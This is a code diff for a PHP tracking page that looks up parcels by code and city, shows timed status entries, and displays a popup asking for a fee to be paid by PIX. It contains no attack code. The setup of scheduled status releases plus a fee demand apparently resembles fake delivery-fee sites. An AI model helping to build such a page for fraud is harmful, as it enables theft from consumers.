@@ -105,26 +105,32 @@ if (isset($_GET['codigo']) && !isset($_POST['codigo'])) {
                         }
                     }
 
-                    if (!empty($rows) && normalizeString($rows[0]['cidade']) === normalizeString($cidade)) {
-                        $statusList = $rows;
-                        foreach ($rows as $r) {
-                            if (!empty($r['taxa_valor']) && !empty($r['taxa_pix'])) {
-                                $temTaxa = true;
+                    if (!empty($rows)) {
+                        if (normalizeString($rows[0]['cidade']) === normalizeString($cidade)) {
+                            $statusList = $rows;
+                            foreach ($rows as $r) {
+                                if (!empty($r['taxa_valor']) && !empty($r['taxa_pix'])) {
+                                    $temTaxa = true;
+                                }
+                                if (!empty($r['prioridade'])) {
+                                    $isExpress = true;
+                                }
                             }
-                            if (!empty($r['prioridade'])) {
-                                $isExpress = true;
+                            $statusAtualTopo = $temTaxa ? "⏳ Aguardando pagamento da taxa" : end($statusList)['status_atual'];
+                            $fotoPedido = getRastreioFoto($pdo, $codigo);
+                            if ($fotoPedido) {
+                                $cacheBuster = @filemtime($fotoPedido['absolute']) ?: time();
+                                $fotoPedidoSrc = $fotoPedido['url'] . '?v=' . $cacheBuster;
+                            } else {
+                                $fotoPedidoSrc = null;
                             }
-                        }
-                        $statusAtualTopo = $temTaxa ? "⏳ Aguardando pagamento da taxa" : end($statusList)['status_atual'];
-                        $fotoPedido = getRastreioFoto($pdo, $codigo);
-                        if ($fotoPedido) {
-                            $cacheBuster = @filemtime($fotoPedido['absolute']) ?: time();
-                            $fotoPedidoSrc = $fotoPedido['url'] . '?v=' . $cacheBuster;
                         } else {
-                            $fotoPedidoSrc = null;
+                            $erroCidade = "⚠️ A cidade informada não confere com este código!";
+                            writeLog("City Mismatch (Auto): DB=" . normalizeString($rows[0]['cidade']) . " Input=" . normalizeString($cidade), 'WARNING');
                         }
                     } else {
-                        $erroCidade = "⚠️ A cidade informada não confere com este código!";
+                        // Results found in DB but none are visible (future/filtered)
+                        $erroCidade = "⏳ Código aguardando liberação no sistema (Horário).";
                     }
                 } else {
                     $erroCidade = "❌ Código inexistente!";
@@ -188,7 +194,7 @@ if (isset($_POST['codigo']) && isset($_POST['cidade'])) {
                         $erroCidade = "⚠️ A cidade informada não confere com este código!";
                     }
                 } else {
-                    $erroCidade = "⚠️ A cidade informada não confere com este código!";
+                    $erroCidade = "⏳ Código aguardando liberação no sistema (Horário).";
                 }
             } else {
                 $erroCidade = "❌ Código inexistente!";
@@ -679,23 +685,23 @@ if (isset($_POST['ajax']) && $_POST['ajax'] === '1') {
             // Se os dados vieram da URL, os resultados já foram renderizados pelo PHP
             // Apenas garantir que o countdown e popup funcionem se necessário
             <?php if ($autoLoadFromUrl && !empty($statusList)): ?>
-                    setTimeout(function () {
-                        try {
-                            startCountdownIfPresent();
-                            <?php if ($temTaxa): ?>
-                                    const pixTextarea = document.querySelector('.pix-box textarea');
-                                if (pixTextarea && typeof showTaxaPopup === 'function') {
-                                    let valorTexto = null;
-                                    const p = pixTextarea.closest('.pix-box') ? pixTextarea.closest('.pix-box').querySelector('p') : null;
-                                    if (p && /R\$\s*[0-9\.,]+/.test(p.textContent)) {
-                                        const m = p.textContent.match(/R\$\s*[0-9\.,]+/);
-                                        valorTexto = m ? m[0] : null;
-                                    }
-                                    showTaxaPopup(valorTexto);
+                setTimeout(function () {
+                    try {
+                        startCountdownIfPresent();
+                        <?php if ($temTaxa): ?>
+                            const pixTextarea = document.querySelector('.pix-box textarea');
+                            if (pixTextarea && typeof showTaxaPopup === 'function') {
+                                let valorTexto = null;
+                                const p = pixTextarea.closest('.pix-box') ? pixTextarea.closest('.pix-box').querySelector('p') : null;
+                                if (p && /R\$\s*[0-9\.,]+/.test(p.textContent)) {
+                                    const m = p.textContent.match(/R\$\s*[0-9\.,]+/);
+                                    valorTexto = m ? m[0] : null;
                                 }
-                            <?php endif; ?>
-                        } catch (_) { /* silencioso */ }
-                    }, 200);
+                                showTaxaPopup(valorTexto);
+                            }
+                        <?php endif; ?>
+                    } catch (_) { /* silencioso */ }
+                }, 200);
             <?php endif; ?>
 
             if (form && results && submitBtn) {
